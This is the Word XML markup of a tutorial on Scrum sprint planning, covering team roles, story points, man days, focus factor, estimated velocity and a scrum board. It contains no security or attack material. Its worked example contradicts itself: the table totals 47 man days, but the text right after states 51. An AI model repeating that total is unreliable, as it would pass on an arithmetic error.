    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Product Burn down Chart</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="159"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED1F84">
        <w:t>Is a “big picture” view of project’s progress (all the releases)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00ED1F84" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:r>
        <w:t>20.41</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="225"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Scrum Management (A Practical Example)</w:t>
      </w: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Introduction</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As a brief introduction, Scrum is an agile process for software development. With Scrum, projects progress via a series of iterations called sprints. Each sprint is typically 2-4 weeks long. Scrum is ideally suited for projects with rapidly changing or highly emergent requirements. I have found it ideal for in-house development though it's equally recommended for third party clients because of rapid change of requirements.</w:t>
      </w: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Introduction to Terms</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblBorders>
          <w:top w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
        </w:tblBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1211"/>
        <w:gridCol w:w="8299"/>
      </w:tblGrid>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Scrum team</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pStyle w:val="NormalWeb"/>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Scrum team consists of product owner, scrum master, developers or anyone who is related to project.</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Product Owner</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In an ideal situation, a product owner is your stakeholder or any representative from client. However, as in our sprint planning, most often we don't find them present for meetings so that part goes to the Project Manager. Again product owner could be anyone who is concerned the most with your project. :)</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Scrum master</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pStyle w:val="NormalWeb"/>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Scrum master could be your team lead or again project manager if you luckily find product stake holder present in the meeting. Scrum master deals with the burn down charts, daily scrum meeting and sprint planning, etc.</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Product backlog</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The product backlog is a prioritized features list containing every desired feature or change to the product.</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Sprint Planning</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pStyle w:val="NormalWeb"/>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Sprint planning is a meeting ideally not more than 4 hours. But I have seen some people take it too long and waste their whole day. In sprint plan, developers, designers, scrum master, products owner or anyone who is concerned with the project or with those tasks are present.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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lastRenderedPageBreak/>
        <w:t>A Practical Example: How We Do Sprint Planning?</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Let's suppose we have one Project Manager as a product owner (In most cases, we don't find stakeholders, customers present all the time), then a scrum master (can be your team lead) then we have a team of 2 developers, 1 designer and 1 database admin.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E432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Note that I am using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Segoe UI" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>developer1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> as a scrum master. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>as</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> show in the figure below:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:noProof/>
          <w:color w:val="800080"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="2327275" cy="1030605"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31749" name="Picture 31749" descr="imag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27275" cy="1030605"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w: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Story Points</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Let's suppose we have discussed in our sprint plan total six tasks. A story point can also be represented as a day but a story point is actually the amount of time you can put to work on any specific story or task.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:noProof/>
          <w:color w:val="800080"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="855980" cy="2327275"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31748" name="Picture 31748" descr="imag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55980" cy="2327275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>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In other words, we have a total of:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E432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Strong"/>
          <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>5 + 3 + 7+ 1+ 3 + 6 = 25 points</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C06A81" w:rsidRDefault="00C06A81" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="300" w:beforeAutospacing="0" w:after="165" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pP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lastRenderedPageBreak/>
        <w:t>Man Days</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 xml:space="preserve">You can always do from 2-4 week sprints, however I prefer 2 weeks of sprint planning. Imagine in 2 weeks of sprint plan, each member has 14 man days. But we always ask in sprint plan if any of our team </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>member</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> has booked their annual leave. Let's suppose developer1 has booked 3 annual leave days, developer2 booked 4 annual leave days, designer booked 2 annual leave days where database admin has no annual leaves booked. In this case, we have:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblBorders>
          <w:top w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
          <w:left w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
        </w:tblBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4361"/>
        <w:gridCol w:w="1098"/>
      </w:tblGrid>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Team member for 2 weeks sprint (14 days)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Man days</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Developer1</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11</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Developer2</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10</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Designer</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12</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Database Admin</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14</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009E4320" w:rsidTr="009E4320">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Total Days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9E4320" w:rsidRDefault="009E4320">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Segoe UI" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>In this, we have total man days = 51</w:t>
      </w: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Focus Factor</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Now let's suppose we have focus factor as 50%.</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 xml:space="preserve">Focus factor is basically the amount of time we can give to our stories (tasks) in our next 2 weeks of sprint. We use a "focus factor" to help account for all the interruptions we will invariably have. When we plan a sprint, we multiply the ideal man hours available in the sprint (40 hours * 2 weeks * x developers) by a percentage such as 0.8. That calculation tells us how many </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>hours worth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> of product backlog items we can commit to for the sprint.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E432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Estimated Velocity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="30"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="808080"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="808080"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>( Available</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="808080"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> man days * Focus factor = Estimated velocity )</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> our case, we have:</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47 * 0.50 (50%) = 23 story points</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lastRenderedPageBreak/>
        <w:t>So our estimated velocity for the upcoming sprint is 23 story points. That means the team should add stories to the sprint until it adds up to approximately 23. In this case, we will remove our task 5 which can be less important and may not fit in this scrum and we will move it to our product backlog.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="111111"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:noProof/>
          <w:color w:val="800080"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3275330" cy="2460625"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31747" name="Picture 31747" descr="imag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75330" cy="2460625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320" w:rsidP="009E4320">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="30"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="808080"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="808080"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Scrum board</w:t>
      </w:r>
    </w:p>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And that is how our scrum board will look like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tblCellMar>
          <w:top w:w="75" w:type="dxa"/>
          <w:left w:w="75" w:type="dxa"/>
          <w:bottom w:w="75" w:type="dxa"/>
          <w:right w:w="75" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2115"/>
        <w:gridCol w:w="1950"/>
        <w:gridCol w:w="1905"/>
      </w:tblGrid>
      <w:tr w:rsidR="009E4320" w:rsidTr="009E4320">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2055" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Not Checked Out</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1950" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Checked Out</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Done</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009E4320" w:rsidTr="009E4320">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2115" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:noProof/>
                <w:color w:val="800080"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0">
                  <wp:extent cx="989330" cy="2327275"/>
                  <wp:effectExtent l="0" t="0" r="0" b="0"/>
                  <wp:docPr id="31746" name="Picture 31746" descr="imag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89330" cy="2327275"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1935" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="009E4320" w:rsidRDefault="009E4320">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
                <w:color w:val="111111"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="CCCCCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
